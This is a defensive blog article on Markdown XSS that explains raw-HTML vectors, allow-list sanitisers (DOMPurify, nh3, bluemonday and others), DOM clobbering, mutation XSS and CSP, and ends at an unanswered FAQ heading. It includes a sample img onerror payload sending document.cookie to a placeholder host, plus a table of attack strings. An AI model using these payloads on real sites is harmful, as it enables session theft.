---
title: "Markdown XSS: Markdown allows raw HTML, which means it allows scripts"
description: Markdown passes raw HTML through, so a .md file can carry scripts: the vectors worth knowing, allow-lists against block-lists, and what a CSP adds
date: 2026-08-21
tag: Safety
keywords: markdown xss, sanitize markdown, sanitize html, dompurify, markdown allow html, raw html in markdown, safe markdown rendering, user generated markdown, content security policy html
---

Markdown was designed to sit next to HTML, not to replace it. The original syntax rules pass HTML through untouched, and the parsers that follow them still do. Hand `marked` or Python-Markdown a `<script>` tag and you get a `<script>` tag back; `markdown-it` and remark do the same once raw HTML is turned on.

### TL;DR

Markdown permits raw HTML by design, so any Markdown you did not write can carry `<script>`, `onerror=`, `javascript:` URLs, `<iframe srcdoc>`, form actions and ids that shadow your own globals. The fix is an **allow-list sanitiser applied to the rendered HTML**, never to the Markdown source, because the renderer invents markup that never appeared literally in the file. Use DOMPurify in a browser and a Node, Python, Go, Java, Rust or Ruby sanitiser against the *same* allow-list on the server, then put a Content Security Policy on the page so a sanitiser bug becomes a blocked request rather than a stolen session.

Nobody sets out to render untrusted Markdown. It arrives sideways. A comment box grows a preview pane, a support desk starts accepting formatted tickets, a build script renders every README in a monorepo onto an internal dashboard, a model's output goes straight into a page so somebody can read it properly. In each case a string somebody else controls ends up in a document your own JavaScript shares a window with.

That is correct behaviour for a file out of your own repository. For a comment, a ticket or a language model's output, it is a hole: something has to stand between the parser and the page.

The word "sanitise" hides how much decision-making is involved. A sanitiser is not a filter you switch on. It is a written statement of which tags and attributes your product allows, applied at exactly one point in the pipeline, in an environment whose HTML parser matches the one the reader will use. Get the statement wrong and it is decoration; get the position wrong and it is worse than decoration, because everything after it looks safe.

## Raw HTML in Markdown is a feature, not an oversight

Markdown's premise was that its syntax would never cover everything, so anything it did not cover you would write in HTML. That premise is why the format spread and why it is still the shortest path from text to a page. It is also why every conformant renderer is, by contract, an HTML passthrough.

A payload need not look like one. This is valid Markdown:

```markdown
Thanks for the fix, this works now.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

The parser recognises a chunk of HTML and copies it to the output. Nothing is malformed, so nothing warns you. There is no error, no log line and no visible artefact in the rendered page — a broken image is the one thing every reader has been trained to ignore.

Parsers used to try to help. `marked` had a `sanitize` option; it was deprecated, then removed, with the documentation pointing at a dedicated sanitiser instead. That was the right call. A half-written HTML filter inside a Markdown parser is worse than none, because it reads like protection: a reviewer sees `sanitize: true` in an options object and stops asking questions. Sanitising HTML correctly means owning a parser, a serialiser, an allow-list and a security-response process, and a Markdown library has no business promising three of those four.

The simplest fix, when it fits: `markdown-it` leaves raw HTML off by default, so angle brackets come out escaped and visible. If your users have no reason to write HTML, leave it off — less code and fewer bugs than any allow-list. [Python-Markdown](/blog/markdown-to-html-in-python) has no equivalent switch and its documentation points you at a separate sanitiser, so a Python pipeline always has a second step whether or not anybody wrote it.

Turning raw HTML off is the only option on this page that removes the attack surface rather than filtering it. Everything else is a judgement about which HTML you are prepared to run.

## The vectors, named

The list below is not a list of exotic tricks. It is the ordinary surface of HTML, which is a language for building applications, being handed a document written by a stranger.

| What arrives | What it does | The rule |
| --- | --- | --- |
| `<script>alert(1)</script>` | Runs, if the HTML is parsed rather than assigned via a safe sink | Never allow `script`; never allow `noscript` either |
| `<img src=x onerror=...>` | Fires when the image fails, which it will | Drop every attribute whose name starts `on` |
| `<a href="javascript:...">` | Runs on click, no script tag needed | Allow `http`, `https`, `mailto` and relative only |
| `<a href="data:text/html,...">` | A whole document in a URL | Keep `data:` out of `href` entirely |
| `<iframe srcdoc="...">` | Carries a document in an attribute, in your origin | Drop `iframe`, `object`, `embed` |
| `<form action="https://elsewhere">` | Turns your inputs into somebody's form | Drop `form`, `button`, `input`, `formaction` |
| `<style>` and `style="..."` | Repositions, overlays, hides, and leaks by `url()` | Drop both unless you have a reason |
| `<a id="config">` | Shadows `window.config` without running code | Prefix every surviving `id` and `name` |
| `<base href="//elsewhere">` | Repoints every relative URL on the page | Drop it; set `base-uri 'none'` |
| `<meta http-equiv="refresh">` | Navigates the reader away | Drop `meta` |
| `<svg>`, `<math>`, `<template>` | Different parsing rules, so different bugs | Drop unless the allow-list needs them |

**Event handler attributes are the main event.** `<script>` is the vector everybody blocks first and the one that matters least, because the interesting payloads do not need it. Every `on*` attribute is an inline script with a different spelling, and the specification keeps adding to the list. That is the clearest single argument for allow-listing attributes instead of naming the ones you dislike: you cannot enumerate `on*` correctly, and you do not have to.

**Schemes need decoding before they need checking.** Test the decoded value, not the raw string. `java&#9;script:`, `JaVaScRiPt:` and a URL with a leading newline are one URL to a browser and several different strings to a naive comparison. Keep `data:` out of `href` as policy: browsers do block a top-level `data:text/html` navigation, but that is their mitigation, not yours, and it does not cover every sink.

**`srcdoc` is the attribute people forget.** An `<iframe srcdoc>` carries a full HTML document inside an attribute value, double-escaped, and inherits the embedding document's origin. A sanitiser that allows `iframe` for video embeds and forgets `srcdoc` has allowed arbitrary same-origin HTML through a hole shaped like a video player.

**Form actions do not need script to steal.** An injected `<form action="https://elsewhere.invalid">` wrapped around part of your page turns the reader's next click into a submission somewhere else, and an `<input type="image" formaction="...">` overrides the action on a form you wrote. Nothing executes; the browser does exactly what the markup says. This is why `form` and `input` deserve care even when you allow `<input type="checkbox" disabled>` for GFM task lists — allow the one attribute combination you need and nothing else.

**CSS is a capability, not a decoration.** The `expression()` syntax that once made `style` directly executable is long gone from current browsers, and it is still the reason CSS has a reputation here. The live problems are quieter. `position: fixed` with a high `z-index` puts an attacker's element over your interface, so a click on "Cancel" lands on something else. `opacity: 0` hides text that is still selectable. A `url()` in a background reaches a third party the moment the element renders, which is a beacon telling somebody when your document was read. None of that runs a script and all of it is a problem, which is why the default answer for `<style>` and `style` is no.

## DOM clobbering: an id that shadows a property

Every element with an `id` becomes a property on `window` under that name, and named form controls become properties of their form. An injected `<a id="config">` makes `window.config` an anchor element, so `if (!window.config) { window.config = defaults }` takes the wrong branch, and `config.apiBase` is now `undefined` instead of your URL — or, with `<a id="config" name="apiBase" href="//elsewhere">`, something an attacker chose. No script ran. An attribute was enough.

Sanitisers cover less of this than their reputation suggests. DOMPurify's default DOM-clobbering check drops an `id` or `name` only when the value is already a property of a `Document` or an `HTMLFormElement`: `id="title"`, `id="body"`, `id="cookie"` and `id="action"` go, `id="config"` stays. `config` is a name your own code invented, and no sanitiser looks at your globals. Fuller coverage is `SANITIZE_NAMED_PROPS`, off by default, which prefixes every `id` and `name` it keeps with `user-content-`.

That prefix is the real defence — an id that cannot collide cannot clobber — and it has to cover both the ids that arrive in the document and the ids your renderer generates from headings, since a heading called "Config" produces `id="config"` with no attacker involved. this site sanitises with DOMPurify in the browser and the `xss` package on the server, against one shared allow-list, and prefixes every heading id with `doc-`: the same defence applied by hand. If you generate anchors for a table of contents, this is the step to add today, before anything else on this page.

## Allow-lists beat block-lists

A block-list names what is forbidden and fails the first time somebody uses a tag nobody thought of. It fails again every time a browser ships a feature, and a third way on capitalisation, encoding, or an attribute the list's author had never heard of. An allow-list names what a document may contain and drops the rest, so its failure mode is a missing `<details>` element rather than a stolen session.

The allow-list stays short, because Markdown's output is small: headings, paragraphs, lists, blockquotes, tables, code, emphasis, links, images, horizontal rules, and an `<input>` for task lists. The attribute list is shorter still — `href`, `src`, `alt`, `title`, `class` if you style code blocks, `colspan` and `rowspan` if your tables need them, `type`, `checked` and `disabled` for task lists.

Write that list down in one file and import it everywhere. The most common real-world failure is not a bypass, it is drift: the browser sanitiser and the server sanitiser were configured separately, six months apart, by two people, and the document that renders safely in the app is stored with the `<iframe>` intact for the next consumer to find. Two allow-lists are one allow-list and one liability.

The other rule is that the allow-list belongs to the product, not the library. `rehype-sanitize`'s `defaultSchema` follows GitHub's sanitisation rules and bluemonday's `UGCPolicy()` is a considered default for user content — both better starting points than anything you will write in an afternoon. Neither knows whether your page has a `<div id="app">` your framework reads. Start from the supplied policy, then subtract.

## Sanitise after rendering, never before

Sanitising the Markdown source means guessing what the parser will do with it, and the parser will surprise you. Markdown has several spellings for the same output — reference links, backslash escapes, character entities, indented HTML blocks — so a filter that greps the source for `javascript:` misses `[click](java&#115;cript:alert(1))` and a reference definition three hundred lines below the link that uses it. Worse, the renderer invents markup that never appeared literally: an autolink becomes a full `<a href>` the source never contained, a fenced block becomes `<pre><code class="language-...">`, a heading becomes an `id`. A filter on the source filters the wrong string.

So sanitise what the renderer emitted, and then stop touching it:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  SANITIZE_NAMED_PROPS: true,
});
```

"Then stop touching it" is the half people skip. A syntax highlighter that wraps tokens in spans, a template that interpolates the string into a wrapper, a regular expression that rewrites anchors to add `target="_blank"`, a step that injects heading anchors for a table of contents: each runs after the sanitiser and sits outside its guarantee. If a transform has to happen, either run it before the sanitiser so its output is checked too, or perform it on the DOM after insertion using `textContent` and `setAttribute` rather than by editing a string.

One more rule about position: store the *original* Markdown, not the sanitised HTML. Sanitising on the way in and trusting the store afterwards freezes your allow-list at the date of the write, so the day you tighten it, every old document stays as it was.

## Mutation XSS: two parsers disagreeing

A sanitiser parses HTML into a tree, decides the tree is clean, and serialises it back to a string. The browser then parses that string again. If the second parse yields a different tree from the first, the check ran on a document nobody ships. That is mutation XSS, and the bug belongs to neither parser — only to the disagreement between them.

The places to watch are where HTML parsing rules change mid-document. Foreign content such as `<svg>` and `<math>` follows XML-ish rules in which `<style>` and comments behave differently. `<template>` has its own content document. Nesting that forces an implicit close tag can move an element out of the subtree it was checked in. Entities inside attribute values decode at a different stage from entities in text.

The defences are dull, and being dull is the point. Keep the sanitiser current, because this class of bug is found by researchers and fixed in releases, so a pinned three-year-old version is the actual risk. Never chain two sanitisers, since whatever the last one emits is what ships and the first one's guarantee is void. Keep foreign content off the allow-list unless a requirement puts it there.

Server-side sanitising has a structural gap here: without a browser it brings its own parser, not the one your reader will use. Ammonia's answer is html5ever, which parses and serialises fragments the way browsers do; sanitize-html's is htmlparser2, chosen for speed and tolerance. Tolerance and fidelity are not the same property. Faking a DOM is worse than either — given an environment it cannot use, DOMPurify returns its input unchanged rather than throwing, so a broken jsdom setup fails open and silently.

## Quick comparison: the cheat sheet

| Tool | Best for | Key capability | Price |
| --- | --- | --- | --- |
| No raw HTML at all | Comments, chat, anything that never needed HTML | `markdown-it` escapes raw HTML by default | Free, MIT |
| DOMPurify (browser) | Rendering untrusted Markdown in a page | Uses the browser's own parser, so no second opinion | Free, Apache 2.0 or MPL 2.0 |
| DOMPurify + jsdom | Reusing one allow-list on a Node server | Same configuration object, synthetic DOM | Free, Apache 2.0 or MPL 2.0; jsdom MIT |
| sanitize-html | Node without a DOM | htmlparser2, per-element attribute allow-lists | Free, MIT |
| js-xss (`xss`) | Node, browsers, and a command line | `whiteList` option, no DOM required, has a CLI | Free, MIT |
| rehype-sanitize | remark and unified pipelines | Sanitises the hast tree, not a string | Free, MIT |
| nh3 | Python | Bindings to Rust's ammonia | Free, MIT |
| Bleach | Nothing new | Was the Python default; now unmaintained | Free, Apache 2.0 |
| bluemonday | Go | `UGCPolicy()` and `StrictPolicy()` presets | Free, BSD-3-Clause |
| OWASP Java HTML Sanitizer | Java | `HtmlPolicyBuilder`, no runtime dependencies | Free, Apache 2.0 or BSD-2-Clause |
| Ammonia | Rust | html5ever, parses as a browser does | Free, MIT or Apache 2.0 |
| Loofah | Ruby | Nokogiri scrubbers; Rails' sanitiser builds on it | Free, MIT |
| Content Security Policy | The sanitiser bug you have not found | Blocks execution regardless of the markup | Free, a web standard |
| Sandboxed iframe | Documents you cannot make safe | `sandbox` drops origin, scripts and forms | Free, part of HTML |
| TransformPipe | Converting a `.md` file you did not write | Sanitises in the browser and on the server, one allow-list | Free |

## The options, one at a time

### No raw HTML at all — the option nobody considers first

Before choosing a sanitiser, ask whether the feature exists at all. If your users are writing comments, chat messages or ticket bodies, almost none of them wants to write HTML, and the ones who do are the reason you are reading this. `markdown-it` ships with `html: false`, which escapes angle brackets so they render as visible text.

| Pros | Cons |
| --- | --- |
| Removes the attack surface instead of filtering it | Anything Markdown cannot express is now impossible |
| No allow-list to maintain, no sanitiser to keep current | Documents written elsewhere may already contain HTML |
| No mutation XSS, because nothing is re-parsed | Users who need a `<details>` block will complain |

**Price:** free, MIT licensed.

**Technical details and features**

- `markdown-it` defaults to `html: false`; raw HTML in the source is escaped, not parsed
- `marked` and Python-Markdown pass raw HTML through and expect a separate sanitiser
- Escaping is not a sanitiser: it produces text, which is why it cannot be bypassed

**Who should use it?** Anybody rendering short user-generated text. This is the correct default for a comment box, and it is chosen far less often than it should be.

### DOMPurify in the browser — the default answer

DOMPurify sanitises an HTML string using the DOM of the environment it runs in. In a browser that is the same parser that will render the result, which removes the mutation-XSS gap at its source: there is no second opinion, because there is only one parser.

| Pros | Cons |
| --- | --- |
| Uses the browser's own parser, so the checked tree is the rendered tree | Needs a DOM, so plain Node requires jsdom |
| Actively maintained, with a real security-response history | `SANITIZE_NAMED_PROPS` is off by default, so clobbering is only partly covered |
| Configuration is one options object you can share across a codebase | Returns its input unchanged if given an unusable DOM, which fails open |
| Hooks let you inspect and reject nodes during sanitising | Allow-list defaults are broad; most products should subtract from them |

**Price:** free, dual licensed Apache 2.0 or MPL 2.0.

**Technical details and features**

- `ALLOWED_TAGS` and `ALLOWED_ATTR` for a from-scratch allow-list; `ADD_TAGS` and `ADD_ATTR` to extend the defaults
- `USE_PROFILES` restricts to HTML, SVG or MathML sets rather than all three
- `FORBID_TAGS` and `FORBID_ATTR` for subtracting from the defaults
- `SANITIZE_NAMED_PROPS` prefixes surviving `id` and `name` values, which is the DOM-clobbering fix
- `ALLOW_DATA_ATTR` and `ALLOW_ARIA_ATTR` control the two bulk attribute families

**Who should use it?** Anybody rendering Markdown into a page in a browser. [The JavaScript walkthrough](/blog/markdown-to-html-in-javascript) covers wiring `marked` and DOMPurify in the right order.

### DOMPurify with jsdom — the same allow-list on a server

DOMPurify also runs in Node against a jsdom window. The reason to do this is not that it is the best server sanitiser — it is that it is the *same* sanitiser, configured by the same object, so the browser and the server cannot drift apart.

| Pros | Cons |
| --- | --- |
| One allow-list, one configuration, two runtimes | jsdom is a large dependency for one job |
| Behaviour matches the browser path closely | jsdom is not a browser, so the parser gap returns |
| Familiar API if your front end already uses it | A misconfigured window makes it a no-op with no error |

**Price:** free; DOMPurify Apache 2.0 or MPL 2.0, jsdom MIT.

**Technical details and features**

- Instantiate with `createDOMPurify(new JSDOM('').window)` and reuse the instance
- Import the allow-list from a shared module so it cannot be edited on one side only
- Assert in tests that a `<script>` tag is removed in the deployed configuration

**Who should use it?** Node services that already render Markdown client-side and want one definition of "safe" rather than two.

### sanitize-html — a Node sanitiser with its own parser

sanitize-html cleans HTML with per-element attribute allow-lists, built on htmlparser2 rather than a DOM. Its option shape maps neatly onto the way a Markdown allow-list actually reads: this tag may have these attributes, and no others.

| Pros | Cons |
| --- | --- |
| No DOM and no jsdom, so it is light in a server process | Its parser is not the browser's, which is the mXSS gap |
| Attribute allow-lists are per element, which is the right granularity | Configuration is verbose for a wide allow-list |
| `transformTags` rewrites elements during the pass | The standalone repository is archived and read-only, with development moved into the ApostropheCMS monorepo (checked on github.com/apostrophecms/sanitize-html, 8 September 2026) |

**Price:** free, MIT licensed.

**Technical details and features**

- `allowedTags`, `allowedAttributes`, `allowedSchemes` and `transformTags` as the main options
- Built on htmlparser2, described by the project as chosen for speed and tolerance
- Runs anywhere Node runs, with no native build step

**Who should use it?** Node services wanting a real allow-list without shipping a DOM implementation, and teams who find its per-element option shape easier to review than a flat list.

### js-xss — a sanitiser with no DOM and a command line

The `xss` package sanitises HTML in Node and in browsers against a `whiteList` option, without needing a DOM. It also ships a CLI, which makes it usable in a shell pipeline as well as in a service.

| Pros | Cons |
| --- | --- |
| Runs in Node and browsers with no DOM dependency | Its own parser, so the parser gap applies |
| A CLI, so it fits a build script without writing code | Smaller configuration surface than DOMPurify's |
| `whiteList` maps directly onto tag-and-attribute pairs | `allowList` is an alias, so documentation reads two ways |

**Price:** free, MIT licensed.

**Technical details and features**

- `whiteList` (aliased as `allowList`) defines permitted tags and their attributes
- Custom handlers for attribute values, useful for scheme checks on `href`
- `xss -i <input> -o <output>` sanitises a file from the command line

**Who should use it?** Node services wanting a small dependency, and anybody sanitising a file in CI without a browser. This is the server half of the pipeline behind this site, paired with DOMPurify in the browser against one shared allow-list.

### rehype-sanitize — sanitising the tree, not the string

If your pipeline is remark or unified, rehype-sanitize sanitises the hast tree in the middle of the chain. Nothing is serialised, checked and re-parsed, which removes an entire class of bug by removing the step where it lives.

| Pros | Cons |
| --- | --- |
| Operates on the tree, so there is no string round-trip to disagree about | Only makes sense inside a unified pipeline |
| `defaultSchema` follows GitHub's sanitisation rules, a considered starting point | The unified pipeline has real learning attached |
| No DOM required; runs in Node, Deno and browsers | ESM-only, and the schema syntax is its own thing to learn |

**Price:** free, MIT licensed.

**Technical details and features**

- Sanitises hast, the HTML syntax tree, between `remark-rehype` and `rehype-stringify`
- `defaultSchema` is exported and can be extended or narrowed
- Place it after any plugin that generates HTML, and before stringify

**Who should use it?** Teams already using remark or unified to transform documents rather than just render them. A sanitiser inside the pipeline beats one bolted onto the output.

### nh3 — the Python answer

nh3 provides Python bindings to ammonia, the Rust HTML sanitiser. Because the work happens in a compiled library that uses a browser-grade parser, it is both fast and closer to browser behaviour than a pure-Python filter.

| Pros | Cons |
| --- | --- |
| Backed by ammonia and html5ever, which parse as browsers do | A compiled dependency, so wheels matter in constrained environments |
| Maintained, and the practical replacement for Bleach | A smaller API surface than Bleach's |
| Allow-list based, matching the model this article argues for | Configuration is not a drop-in for Bleach's |

**Price:** free, MIT licensed.

**Who should use it?** Python services sanitising Markdown output, and anyone still importing Bleach.

### Bleach — the one to migrate off

Bleach was the default Python HTML sanitiser for years and much existing tooling still imports it. It is no longer maintained: the README states there will be no future releases, including for security issues (checked on github.com/mozilla/bleach, 8 September 2026).

| Pros | Cons |
| --- | --- |
| A large body of existing code and documentation | Unmaintained, with no security releases coming |
| Familiar allow-list API | An unmaintained sanitiser is the one dependency you cannot pin and forget |
| Still functional for the cases it handled | mXSS defence depends on ongoing maintenance, which has stopped |

**Price:** free, Apache 2.0 licensed.

**Who should use it?** Nobody, for new work. If it is in your requirements file, that is a migration ticket, not a footnote — this is a class of bug where "keep it current" is most of the defence.

### bluemonday — the Go answer

bluemonday sanitises HTML in Go against a policy you build or one of its supplied presets. Its two named policies map cleanly onto the two situations most products have.

| Pros | Cons |
| --- | --- |
| `UGCPolicy()` is a sensible starting point for user content | Go only |
| `StrictPolicy()` strips all markup, for titles and single-line fields | Policy building is code, so it needs review like code |
| Allow-list based by design, with regexp patterns for attribute values | Its own parser, so the parser gap applies |

**Price:** free, BSD-3-Clause licensed.

**Technical details and features**

- `UGCPolicy()` permits a broad set of user-content elements and excludes iframes, objects, embeds, styles and scripts
- `StrictPolicy()` removes all elements and attributes
- Policies are composable, so you can start from a preset and subtract

**Who should use it?** Go services rendering Markdown from users. Start with `UGCPolicy()`, then remove what your product does not need.

### OWASP Java HTML Sanitizer — the Java answer

A Java sanitiser with an explicit policy builder and no runtime dependencies, maintained under the OWASP umbrella. The `HtmlPolicyBuilder` API makes the allow-list read like a specification, which is useful when the allow-list has to survive a security review.

| Pros | Cons |
| --- | --- |
| `HtmlPolicyBuilder` produces a readable, reviewable policy | Java only |
| No runtime dependencies | Prepackaged policies are narrow, so most work is yours |
| Prepackaged `Sanitizers.FORMATTING` and `Sanitizers.LINKS`, combinable | Its own parser, so the parser gap applies |

**Price:** free, dual licensed Apache 2.0 or BSD-2-Clause.

**Who should use it?** JVM services. The builder API is the clearest expression of allow-listing in any language on this list, which makes it a good thing to show somebody who has not been convinced yet.

### Ammonia — the Rust answer, and the parser argument

Ammonia is an allow-list HTML sanitiser in Rust built on html5ever. Its stated approach is to parse and serialise document fragments the same way browsers do, which is the property that matters most for a server-side sanitiser.

| Pros | Cons |
| --- | --- |
| html5ever parses as browsers do, narrowing the parser gap | Rust only, unless you use it through bindings |
| Allow-list based and fast | Fewer ready-made policies than bluemonday's |
| Also the engine behind nh3 for Python | A compiled dependency in polyglot builds |

**Price:** free, dual licensed MIT or Apache 2.0.

**Who should use it?** Rust services, and — through nh3 — Python ones. Also worth reading if you are choosing a server sanitiser in any language, because its parser choice is the argument you should be applying to the others.

### Loofah — the Ruby answer

Loofah scrubs HTML using Nokogiri, with scrubbers that strip, prune, escape or whitewash markup. Rails' own HTML sanitiser is built on top of it, so most Ruby applications are already using it indirectly.

| Pros | Cons |
| --- | --- |
| Built on Nokogiri, a well-exercised HTML parser | Ruby only |
| Already underneath Rails' sanitiser, so it is well tested in the wild | Nokogiri is a native dependency |
| Several scrubbing strategies, not just one | The strategy names take a moment to learn |

**Price:** free, MIT licensed.

**Who should use it?** Ruby and Rails applications. If you are calling Rails' `sanitize` helper you are already here; the question is whether the allow-list is yours or the framework's default.

### Content Security Policy — the layer a sanitiser cannot be

A CSP is not a sanitiser and does not compete with one. It answers a different question: what happens when the sanitiser is wrong. A sanitiser tries to guarantee that no executable markup reaches the page; a CSP tells the browser not to execute markup regardless of how it got there.

| Pros | Cons |
| --- | --- |
| Works on the bug you have not found yet | Not a substitute for sanitising; it does not remove anything |
| `script-src 'none'` is absolute on a page with no scripts of its own | An app page running its own JavaScript cannot use `'none'` |
| `base-uri 'none'` and `frame-ancestors 'none'` close vectors no allow-list covers | Retrofitting a policy onto an existing app is real work |
| Reporting endpoints turn attempted injections into telemetry | `frame-ancestors` and `sandbox` are ignored in a `<meta>` tag |

**Price:** free, a web standard implemented by browsers.

**Technical details and features**

- `script-src 'none'` on a page whose only job is displaying documents
- `base-uri 'none'` neutralises an injected `<base href>`, which no tag allow-list can express
- `frame-ancestors 'none'` stops your document being framed inside somebody else's page
- `img-src` and `connect-src` limit where a surviving element can send a request
- Delivered as a response header or a `<meta http-equiv>` tag, the meta form ignoring `frame-ancestors`, `report-uri` and `sandbox`

**Who should use it?** Every page that renders somebody else's document. The trade-off is real: a page running its own JavaScript cannot use `script-src 'none'`, which argues for rendering untrusted documents on a route of their own. A document [shared as a link](/blog/share-a-markdown-document-as-a-link) from TransformPipe is served that way, and the file you download has no scripts at all.

### A sandboxed iframe — isolation when filtering is not enough

Sometimes the document has to keep markup you cannot safely allow — an internal report with its own styles, a rendered email, output from a system you do not control. Render it into an iframe with a `sandbox` attribute and it runs in an opaque origin with no access to your page.

| Pros | Cons |
| --- | --- |
| Isolation instead of filtering, so allow-list gaps stop mattering as much | Layout is now yours to manage: sizing, scrolling, printing |
| `sandbox` with no `allow-same-origin` means no access to your storage or DOM | `allow-scripts` plus `allow-same-origin` together defeats the whole thing |
| Combines with a CSP rather than competing with it | Links, focus and accessibility all need deliberate wiring |

**Price:** free, part of HTML.

**Who should use it?** Anybody displaying documents whose markup must survive intact. Use it *with* a sanitiser, not instead of one — a sandbox stops a script reaching your page, and does nothing about a document that phishes the reader inside the frame.

### TransformPipe — a converter that has already made these decisions

TransformPipe converts Markdown to a complete, self-contained HTML document in your browser. The relevant part here is that sanitising is not an option you can forget to turn on: raw HTML in the source passes an allow-list on the way to the page and on the way into the exported file.

| Pros | Cons |
| --- | --- |
| One allow-list, applied by DOMPurify in the browser and `xss` on the server | The allow-list is fixed: no custom policy of your own |
| Heading ids are prefixed, so generated anchors cannot clobber globals | One document at a time, not a build pipeline |
| Signed out, nothing is uploaded — the file is read and converted locally | The browser does the work, so a very large file depends on the machine |
| The export is a single file with no external requests of any kind | Not a library: it converts, it does not embed in your app |

**Price:** free. An account adds history, sharing and an API, also free.

**Technical details and features**

- Sanitises the rendered HTML, not the Markdown source
- The same allow-list on both sides of the network boundary, so the two cannot drift
- Heading ids prefixed with `doc-`, which is the DOM-clobbering defence applied by hand
- The same conversion from a REST API, a CLI, a GitHub Action and an MCP server

**Who should use it?** Anybody with a `.md` file from somewhere else and a person to send it to. Model output is the common case: [turning it into a page somebody can read](/blog/ai-output-to-a-shareable-page) means rendering a string you did not write, which is exactly the problem this article describes.

## Where the obvious choice fails

DOMPurify is the right default and the honest section is about its limits, because "we use DOMPurify" is where a lot of security reviews stop.

**It needs a DOM, and a fake one fails open.** On a server you either ship jsdom or use a different library. Given an environment it cannot work in, DOMPurify returns its input unchanged instead of throwing, which is the worst available failure mode: a broken configuration and a working one produce identical output for every document that contains no HTML. The cost of not testing this is a service that has never sanitised anything and has no way to know.

**The defaults are broad, and the dangerous default is off.** DOMPurify's out-of-the-box allow-list is designed to be generally useful, not minimal for your product, and `SANITIZE_NAMED_PROPS` — the option that actually stops DOM clobbering — is off unless you turn it on. Neither is a criticism of the library; both are a criticism of installing it and moving on.

**A sanitiser cannot know your globals.** `id="config"`, `id="state"`, `id="init"` — whatever names your own code touches on `window` — are invisible to it, because no sanitiser reads your bundle. Prefixing every surviving id is the only defence that scales, since it stops depending on a list of names somebody has to maintain.

**Clean is not the same as harmless.** An allow-list that permits `<a href="https://...">` and `<img src="https://...">` permits a page that looks exactly like your login screen, and an image whose loading tells a third party when a document was opened. Neither runs a script and neither is an XSS bug. If your threat model includes phishing or read receipts, the sanitiser is not the control you need — `img-src` in a CSP is closer, and an interstitial on outbound links closer still.

**Everything downstream inherits the risk and none of the guarantee.** The highlighter, the anchor injector, the wrapper template, the "just add `target=_blank`" regular expression: each is a place where sanitised HTML becomes unsanitised HTML with no visible change to the code that calls the sanitiser. This is the most common way a correct sanitiser ends up in an incident report.

**The server cannot set a header on a file.** A CSP is a property of a response, and a downloaded `.html` file is not a response. Opened from disk it has no headers, so the only policy it can carry is a `<meta http-equiv>` tag — which works for `script-src` and `img-src` and is ignored for `frame-ancestors` and `sandbox`. Hence the argument for an export with no scripts in it at all: a document with nothing executable is safe even on `file://`, where a header cannot reach it.

## Sanitising a document you are about to hand to somebody else

Most writing about markdown xss assumes a web application: your page, your origin, your session. Converting a file is a different situation with a different set of duties.

When you render untrusted Markdown in your app, you are protecting your users from a document. When you convert a Markdown file and send the HTML to a colleague, you are protecting *them* from a document — one that arrives with your name on it, from an address they trust, past whatever filtering their organisation does to attachments from strangers. A `<script>` that survives your conversion has been laundered.

Three things follow. Sanitise on conversion even though the file is "just a document", because the recipient's browser will execute what you send as readily as yours would. Prefer an export with no scripts at all over one with safe scripts, since neither the recipient nor their mail gateway can audit the difference. And keep the file self-contained, which is a safety property as much as a convenience one: a document that requests nothing from the network cannot report back when it was read, and cannot change after you sent it.

Then test your own pipeline with three inputs: an `onerror` attribute, a `javascript:` link, and an `id` matching a global your code reads. If either of the first two reaches the page, you have a sanitiser to add and probably a header to set. The third will reach it, which is the point — check that it arrives under a prefix rather than under the name your code reads. If you are choosing a converter rather than building one, [what each tool does at the sanitising stage](/blog/best-markdown-to-html-converters) is the column that matters, and several well-liked tools pass raw HTML through by design.

## How to choose

1. **Ask whether raw HTML is a feature you actually offer.** If it is not, escape it and stop: `html: false` in `markdown-it` costs nothing to maintain and cannot be bypassed, and the alternative is an allow-list you will still own in three years.
2. **Pick the sanitiser that runs where the HTML is rendered, then test that it fails.** In a browser DOMPurify uses the parser that will render the result, closing the mutation-XSS gap; on a server every option brings its own parser, so pick one that aims at browser fidelity — and assert in your test suite that a `<script>` tag is removed in production configuration, because a misconfigured DOM fails open silently.
3. **Write one allow-list and import it everywhere.** Two independently configured sanitisers will diverge, and the day they do, the document that renders safely in your app is stored with an `<iframe>` in it for the next consumer to find.
4. **Put the sanitiser after the renderer and after every transform, and prefix every id it keeps.** Anything that edits the HTML string downstream sits outside the sanitiser's guarantee, and DOM clobbering needs no script at all, so a prefix on surviving ids — including the ones your heading anchors generate — is a one-line change that ends a whole class of bug.
5. **Add the header you would need if the sanitiser were wrong.** `script-src 'none'`, `base-uri 'none'` and `frame-ancestors 'none'` on a document-viewing route turn a successful injection into a blocked request; if you cannot use them because the page runs your app, that is the reason to move document rendering to its own route.

## Conclusion

Markdown allows raw HTML because it was designed to, and no amount of care in a parser changes that; the safety of a rendered Markdown document is a property of what you do after rendering. That means one written allow-list applied to the rendered HTML, the same allow-list in the browser and on the server, every surviving id prefixed, nothing editing the string afterwards, and a Content Security Policy standing behind all of it for the bug you have not found. If you would rather not own that code for a file you just need to convert and send, [a converter that sanitises by default's Markdown to HTML conversion](/) applies those steps in your browser — one allow-list, prefixed heading ids, an export with no scripts and no network requests, free, with nothing uploaded when you are signed out.

## FAQ

### Is Markdown vulnerable to XSS?

Markdown itself is a text format, but almost every Markdown renderer passes raw HTML through to the output, which means a `.md` file can carry `<script>`, `onerror=` and `javascript:` URLs straight to the browser. The vulnerability is in the rendering pipeline, not the format. Any pipeline that renders Markdown you did not write needs a sanitiser between the renderer and the page.

### Does DOMPurify make Markdown safe on its own?

It removes the executable markup, which is most of the job, and it leaves three gaps. Its DOM-clobbering protection is only complete with `SANITIZE_NAMED_PROPS` turned on, it cannot know which globals your own code reads, and anything that edits the HTML string after it runs is outside its guarantee. Pair it with a Content Security Policy and treat its output as final.

### Should I sanitise the Markdown or the HTML?

The HTML, always, and only after every transform has run. Markdown has multiple spellings for the same output and the renderer invents markup that never appeared in the source — an autolink becomes a full anchor, a heading becomes an id — so a filter on the source is checking a string that is not what ships.

### Is it enough to escape HTML instead of sanitising it?

If your users have no need to write HTML, escaping is better than sanitising: it produces text, so there is nothing to bypass and no allow-list to maintain. `markdown-it` does this by default with `html: false`. The moment somebody needs a `<details>` block or an embedded table, you are back to an allow-list.

### What does a Content Security Policy protect against that a sanitiser does not?

